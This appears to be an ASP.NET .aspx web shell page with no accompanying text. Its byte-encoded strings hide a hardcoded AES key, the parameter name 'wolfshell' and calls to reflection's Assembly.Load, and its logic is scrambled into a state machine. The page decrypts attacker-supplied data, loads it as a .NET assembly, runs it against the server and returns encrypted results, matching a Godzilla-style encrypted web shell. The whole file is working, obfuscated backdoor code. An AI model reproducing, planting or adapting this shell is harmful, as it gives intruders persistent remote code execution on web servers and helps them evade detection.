<%@ Page Language="C#"%><%
var f_a1b2 = new Func<byte[], string>(p_c3d4 => System.Text.Encoding.Default.GetString(p_c3d4));
var _s_map = new System.Collections.Generic.Dictionary<int, byte[]>() {
    {10, new byte[]{51,99,54,101,48,98,56,97,57,99,49,53,50,50,52,97}},
    {11, new byte[]{119,111,108,102,115,104,101,108,108}},
    {12, new byte[]{112,97,121,108,111,97,100}},
    {13, new byte[]{76,111,97,100}},
    {14, new byte[]{76,89}},
    {15, new byte[]{83,121,115,116,101,109,46,82,101,102,108,101,99,116,105,111,110,46,65,115,115,101,109,98,108,121}}
};
int state = 0;
while (state != 99) {
    try {
        switch (state) {
            case 0:
                string k_e5f6 = f_a1b2(_s_map[10]);
                string p_g7h8 = f_a1b2(_s_map[11]);
                string m_i9j0 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(p_g7h8 + k_e5f6))).Replace("-", "");
                byte[] d_k1l2 = System.Convert.FromBase64String(Context.Request[p_g7h8]);
                d_k1l2 = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(k_e5f6), System.Text.Encoding.Default.GetBytes(k_e5f6)).TransformFinalBlock(d_k1l2, 0, d_k1l2.Length);
                if (Context.Session[f_a1b2(_s_map[12])] == null) { state = 1; } else { state = 2; }
                Session["d_k1l2"] = d_k1l2; Session["k_e5f6"] = k_e5f6; Session["m_i9j0"] = m_i9j0;
                break;
            case 1:
                var asm_type = System.Type.GetType(f_a1b2(_s_map[15]));
                var load_method = asm_type.GetMethod(f_a1b2(_s_map[13]), new System.Type[] { typeof(byte[]) });
                Context.Session[f_a1b2(_s_map[12])] = load_method.Invoke(null, new object[] { Session["d_k1l2"] });
                state = 99;
                break;
            case 2:
                System.IO.MemoryStream ms_m3n4 = new System.IO.MemoryStream();
                object o_p5q6 = ((System.Reflection.Assembly)Context.Session[f_a1b2(_s_map[12])]).CreateInstance(f_a1b2(_s_map[14]));
                o_p5q6.Equals(Context);
                o_p5q6.Equals(ms_m3n4);
                o_p5q6.Equals(Session["d_k1l2"]);
                o_p5q6.ToString();
                byte[] r_s7t8 = ms_m3n4.ToArray();
                string _m = (string)Session["m_i9j0"];
                string _k = (string)Session["k_e5f6"];
                Context.Response.Write(_m.Remove(16));
                Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(_k), System.Text.Encoding.Default.GetBytes(_k)).TransformFinalBlock(r_s7t8, 0, r_s7t8.Length)));
                Context.Response.Write(_m.Remove(0, 16));
                state = 99;
                break;
        }
    } catch { state = 99; }
}
%>